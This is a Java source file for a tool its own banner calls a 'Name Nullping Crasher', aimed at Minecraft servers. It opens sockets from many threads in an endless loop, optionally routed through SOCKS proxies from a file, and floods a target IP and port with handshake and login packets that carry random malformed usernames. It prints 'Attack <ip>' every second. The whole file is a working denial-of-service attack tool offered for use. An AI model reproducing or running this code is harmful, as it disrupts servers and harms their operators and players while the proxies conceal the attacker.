package me.nzxter.namenullping;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintStream;
import java.io.Reader;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.net.SocketAddress;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;

public class NameNullPing {
    private static int x = 0;

    public static void main(String[] args) {
        if (args.length == 5) {
            try {
            	NameNullPing.pingThreadCrasher(args[0], Integer.valueOf(args[1]), Integer.valueOf(args[2]), Long.valueOf(args[3]), Boolean.valueOf(args[4]));
            }
            catch (NumberFormatException e) {
                System.out.println("The Port/Thread/Delay/Proxies");
            }
        } else {
            System.out.println("<------------------------------------------------------------------------->");
            System.out.println("                      Name Nullping Crasher by Nzxter F.M                       ");
            System.out.println("");
            System.out.println("");
            System.out.println("Usage: java -jar namenullping.jar IP/Domain PORT THREADS DELAY PROXIES");
            System.out.println("Example: java -jar namenullping.jar 1.1.1.1/example.net 25565 2500 3 true/false");
            System.out.println("");
            System.out.println("");
            System.out.println("<------------------------------------------------------------------------->");
        }
    }
    


        
        public static void pingThreadCrasher(String ip, int port, int threads, Long delay, boolean use) {
            ArrayList<Proxy> proxies = new ArrayList<Proxy>();
        	if (use) {
	            try {
	                String s;
	                BufferedReader br = new BufferedReader(new FileReader(new File("proxies.txt")));
	                while ((s = br.readLine()) != null) {
	                    String pip = s.split(":")[0];
	                    int pport = Integer.parseInt(s.split(":")[1]);
	                    Proxy p = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress(pip, pport));
	                    proxies.add(p);
	                }
	                br.close();
	            }
	            catch (Exception br) {
	                // empty catch block
	            }
	        }
	        for (int i = 0; i < threads; ++i) {
	            new Thread(() -> {
	                do {
	                    try {
	                        do {
	                            ++x;
	                            if (use) {
	                                for (Proxy p : proxies) {
	                                    NameNullPing.ping(ip, port, p);
	                                }
	                            } else {
	                                NameNullPing.ping(ip, port);
	                            }
	                            Thread.sleep(delay);
	                        } while (true);
	                    }
	                    catch (Exception exception) {
	                        continue;
	                    }
	                } while (true);
	            }).start();
	        }
	        new Timer().scheduleAtFixedRate(new TimerTask(){
	
	            @Override
	            public void run() {
	                System.out.println("Attack " + ip + " with " + x + "bytes");
	                x = 0;
	            }
	        }, 0L, 1000L);
	    }

    public static void ping(String ip, int port) throws IOException, InterruptedException {
        Socket s = new Socket(ip, port);
        Thread.sleep(1000L);
        DataOutputStream out = new DataOutputStream(s.getOutputStream());
        out.write(15);
        out.write(0);
        out.write(47);
        out.write(9);
        out.writeBytes(ip);
        out.write(99);
        out.write(223);
        out.write(2);
        String nick = NameNullPing.randomString(14);
        out.write(nick.length() + 2);
        out.write(0);
        out.write(nick.length());
        out.writeBytes(nick);
    }

    public static void ping(String ip, int port, Proxy p) throws IOException, InterruptedException {
        Socket s = new Socket(p);
        s.connect(new InetSocketAddress(ip, port));
        Thread.sleep(1000L);
        DataOutputStream out = new DataOutputStream(s.getOutputStream());
        out.write(15);
        out.write(0);
        out.write(47);
        out.write(9);
        out.writeBytes(ip);
        out.write(99);
        out.write(223);
        out.write(2);
        String nick = NameNullPing.randomString(14);
        out.write(nick.length() + 2);
        out.write(0);
        out.write(nick.length());
        out.writeBytes(nick);
    }

    private static String randomString(int length) {
        byte[] array = new byte[length];
        new Random().nextBytes(array);
        return new String(array, StandardCharsets.UTF_8);
    }

}

